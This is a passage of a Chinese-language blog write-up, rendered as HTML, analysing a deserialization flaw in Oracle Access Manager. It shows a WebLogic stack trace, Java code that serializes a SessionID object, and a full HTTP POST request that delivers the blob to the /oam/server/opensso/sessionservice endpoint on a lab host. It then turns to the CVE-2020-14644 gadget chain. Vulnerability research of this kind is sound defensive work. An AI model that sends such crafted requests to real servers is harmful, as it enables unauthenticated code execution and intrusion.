</span></span><span style=display:flex><span>doPost:177, AMServlet (oracle.security.am.pbl.transport.http)
</span></span><span style=display:flex><span>service:707, HttpServlet (javax.servlet.http)
</span></span><span style=display:flex><span>service:790, HttpServlet (javax.servlet.http)
</span></span><span style=display:flex><span>run:295, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)
</span></span><span style=display:flex><span>run:260, StubSecurityHelper$ServletServiceAction (weblogic.servlet.internal)
</span></span><span style=display:flex><span>invokeServlet:137, StubSecurityHelper (weblogic.servlet.internal)
</span></span><span style=display:flex><span>execute:353, ServletStubImpl (weblogic.servlet.internal)
</span></span><span style=display:flex><span>doFilter:25, TailFilter (weblogic.servlet.internal)
</span></span><span style=display:flex><span>doFilter:78, FilterChainImpl (weblogic.servlet.internal)
</span></span><span style=display:flex><span>run:175, JpsAbsFilter$3 (oracle.security.jps.ee.http)
</span></span><span style=display:flex><span>doPrivileged:-1, AccessController (java.security)
</span></span><span style=display:flex><span>doAsPrivileged:315, JpsSubject (oracle.security.jps.util)
</span></span><span style=display:flex><span>runJaasMode:650, JpsPlatformUtil (oracle.security.jps.ee.util)
</span></span><span style=display:flex><span>runJaasMode:112, JpsAbsFilter (oracle.security.jps.ee.http)
</span></span><span style=display:flex><span>doFilterInternal:293, JpsAbsFilter (oracle.security.jps.ee.http)
</span></span><span style=display:flex><span>doFilter:150, JpsAbsFilter (oracle.security.jps.ee.http)
</span></span><span style=display:flex><span>doFilter:94, JpsFilter (oracle.security.jps.ee.http)
</span></span><span style=display:flex><span>doFilter:78, FilterChainImpl (weblogic.servlet.internal)
</span></span><span style=display:flex><span>doFilter:248, DMSServletFilter (oracle.dms.servlet)
</span></span><span style=display:flex><span>doFilter:78, FilterChainImpl (weblogic.servlet.internal)
</span></span><span style=display:flex><span>doFilter:92, ExtensibleGlobalFilter (oracle.jrf.servlet)
</span></span><span style=display:flex><span>doFilter:78, FilterChainImpl (weblogic.servlet.internal)
</span></span><span style=display:flex><span>wrapRun:3797, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)
</span></span><span style=display:flex><span>run:3763, WebAppServletContext$ServletInvocationAction (weblogic.servlet.internal)
</span></span><span style=display:flex><span>doAs:344, AuthenticatedSubject (weblogic.security.acl.internal)
</span></span><span style=display:flex><span>runAsForUserCode:197, SecurityManager (weblogic.security.service)
</span></span><span style=display:flex><span>runAsForUserCode:203, WlsSecurityProvider (weblogic.servlet.provider)
</span></span><span style=display:flex><span>run:71, WlsSubjectHandle (weblogic.servlet.provider)
</span></span><span style=display:flex><span>doSecuredExecute:2451, WebAppServletContext (weblogic.servlet.internal)
</span></span><span style=display:flex><span>securedExecute:2299, WebAppServletContext (weblogic.servlet.internal)
</span></span><span style=display:flex><span>execute:2277, WebAppServletContext (weblogic.servlet.internal)
</span></span><span style=display:flex><span>runInternal:1720, ServletRequestImpl (weblogic.servlet.internal)
</span></span><span style=display:flex><span>run:1680, ServletRequestImpl (weblogic.servlet.internal)
</span></span><span style=display:flex><span>run:272, ContainerSupportProviderImpl$WlsRequestExecutor (weblogic.servlet.provider)
</span></span><span style=display:flex><span>_runAs:352, ComponentInvocationContextManager (weblogic.invocation)
</span></span><span style=display:flex><span>runAs:337, ComponentInvocationContextManager (weblogic.invocation)
</span></span><span style=display:flex><span>doRunWorkUnderContext:57, LivePartitionUtility (weblogic.work)
</span></span><span style=display:flex><span>runWorkUnderContext:41, PartitionUtility (weblogic.work)
</span></span><span style=display:flex><span>runWorkUnderContext:655, SelfTuningWorkManagerImpl (weblogic.work)
</span></span><span style=display:flex><span>execute:420, ExecuteThread (weblogic.work)
</span></span><span style=display:flex><span>run:360, ExecuteThread (weblogic.work)
</span></span></code></pre></td></tr></table></div></div><h3 id=构造sessionid对象触发正常反序列化>构造SessionID对象触发正常反序列化<a hidden class=anchor aria-hidden=true href=#构造sessionid对象触发正常反序列化>#</a></h3><p>从代码 <code>oracle.security.am.proxy.opensso.controller.OpenssoEngineController#unmarshal</code> 看，接口 <code>/oam/server/opensso/sessionservice</code> 想要的对象数据是 <code>oracle.security.am.proxy.opensso.session.utils.SessionID</code> 类的。我们来构造一个可以正常完整触发反序列化的对象数据。</p><p>生成<code>requester</code>中的序列化数据。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-55-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-55-36>36</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> oracle.security.am.proxy.opensso.session.utils.SessionID<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Base64<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>App</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        sessionidobj<span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>sessionidobj</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 生成一个最基本的sessionID
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        SessionID sessionID<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> SessionID<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;neo&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>oamserialize<span style=color:#f92672>(</span>sessionID<span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>//    https://gist.github.com/andy722/1524968
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#f92672>&lt;</span>T <span style=color:#66d9ef>extends</span> Serializable<span style=color:#f92672>&gt;</span> String <span style=color:#a6e22e>serialize</span><span style=color:#f92672>(</span>T item<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> ByteArrayOutputStream byteArrayOutputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayOutputStream<span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> ObjectOutputStream objectOutputStream<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            objectOutputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream<span style=color:#f92672>(</span>byteArrayOutputStream<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            objectOutputStream<span style=color:#f92672>.</span><span style=color:#a6e22e>writeObject</span><span style=color:#f92672>(</span>item<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            objectOutputStream<span style=color:#f92672>.</span><span style=color:#a6e22e>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getEncoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>encodeToString</span><span style=color:#f92672>(</span>byteArrayOutputStream<span style=color:#f92672>.</span><span style=color:#a6e22e>toByteArray</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IOException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#f92672>&lt;</span>T <span style=color:#66d9ef>extends</span> Serializable<span style=color:#f92672>&gt;</span> String <span style=color:#a6e22e>oamserialize</span><span style=color:#f92672>(</span>T item<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        String data<span style=color:#f92672>=</span>serialize<span style=color:#f92672>(</span>item<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getEncoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>encodeToString</span><span style=color:#f92672>((</span><span style=color:#e6db74>&#34;object:&#34;</span><span style=color:#f92672>+</span>data<span style=color:#f92672>).</span><span style=color:#a6e22e>getBytes</span><span style=color:#f92672>(</span>StandardCharsets<span style=color:#f92672>.</span><span style=color:#a6e22e>UTF_8</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>  
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>发送请求</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-56-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-56-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>POST /oam/server/opensso/sessionservice HTTP/1.1
</span></span><span style=display:flex><span>Host: 192.168.175.139:14100
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept: */*
</span></span><span style=display:flex><span>Accept-Language: en
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q=0.9
</span></span><span style=display:flex><span>Content-Type: text/xml
</span></span><span style=display:flex><span>Content-Length: 906
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>RequestSet</span> <span style=color:#a6e22e>vers</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;vers123&#34;</span> <span style=color:#a6e22e>svcid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;session&#34;</span> <span style=color:#a6e22e>reqid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;req_1&#34;</span>&gt;
</span></span><span style=display:flex><span> &lt;<span style=color:#f92672>Request</span> <span style=color:#a6e22e>dtdid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;dtd1&#34;</span> <span style=color:#a6e22e>sid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;sid1&#34;</span>&gt;<span style=color:#75715e>&lt;![CDATA[
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;authIdentifier reqid=&#34;1&#34; requester=&#34;b2JqZWN0OnJPMEFCWE55QURodmNtRmpiR1V1YzJWamRYSnBkSGt1WVcwdWNISnZlSGt1YjNCbGJuTnpieTV6WlhOemFXOXVMblYwYVd4ekxsTmxjM05wYjI1SlJLOGVKQWl5c3BxUUFnQUhXZ0FJYVhOUVlYSnpaV1JNQUFwamIyOXJhV1ZOYjJSbGRBQVRUR3BoZG1FdmJHRnVaeTlDYjI5c1pXRnVPMHdBRDJWdVkzSjVjSFJsWkZOMGNtbHVaM1FBRWt4cVlYWmhMMnhoYm1jdlUzUnlhVzVuTzB3QURXVjRkR1Z1YzJsdmJsQmhjblJ4QUg0QUFrd0FDbVY0ZEdWdWMybHZibk4wQUE5TWFtRjJZUzkxZEdsc0wwMWhjRHRNQUE5elpYTnphVzl1VTJWeWRtVnlTVVJ4QUg0QUFrd0FCSFJoYVd4eEFINEFBbmh3QUhCMEFBTnVaVzl3YzNJQUVXcGhkbUV1ZFhScGJDNUlZWE5vVFdGd0JRZmF3Y01XWU5FREFBSkdBQXBzYjJGa1JtRmpkRzl5U1FBSmRHaHlaWE5vYjJ4a2VIQS9RQUFBQUFBQUFIY0lBQUFBRUFBQUFBQjRkQUFBY0E9PQ==&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;SessionID&gt;123&lt;/SessionID&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;/authIdentifier&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	]]&gt;</span>
</span></span><span style=display:flex><span> &lt;/<span style=color:#f92672>Request</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>RequestSet</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>反序列化现场</p><p><img loading=lazy src=image-20220323114217807.png alt=image-20220323114217807></p><h3 id=关联漏洞cve-2020-14644>关联漏洞：CVE-2020-14644<a hidden class=anchor aria-hidden=true href=#关联漏洞cve-2020-14644>#</a></h3><p>有了入口以后，我们还需要一个gadget来让执行流程最终走到自定义的恶意代码。作者在分析文章中说他们经过尝试发现 CVE-2020–14644 的gadget是可用的。于是我们先复现 CVE-2020–14644 。</p><h4 id=构造反序列化demo>构造反序列化demo<a hidden class=anchor aria-hidden=true href=#构造反序列化demo>#</a></h4><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-57-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-57-14>14</a>
